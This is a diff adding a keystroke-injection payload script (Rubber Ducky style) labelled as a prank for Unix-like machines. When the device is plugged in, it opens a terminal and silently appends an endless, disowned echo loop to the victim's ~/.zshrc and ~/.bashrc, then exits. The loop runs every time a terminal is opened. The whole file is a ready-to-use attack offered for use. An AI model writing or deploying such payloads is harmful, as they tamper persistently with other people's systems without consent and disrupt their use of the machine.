@@ -1,0 +1,18 @@
+REM Title: Say the magic word
+REM Creator: Brandon Kelly
+REM Modified by: FalsePhilosopher
+REM Target:  Unix-like
+REM Props: Hak5, the community and memes
+REM Version: 1.0
+REM Category: Prank
+REM creates an endless loop of the echo below every time they open a terminal.
+REM
+REM initialization delay
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+STRING echo "end=no && while end=no; do echo Uh Uh Uh, You didn't say the magic word. && sleep 1 && done & disown" >> ~/.zshrc && echo "end=no && while end=no; do echo Uh Uh Uh, You didn't say the magic word. && sleep 1 && done & disown" >> ~/.bashrc && exit
+ENTER
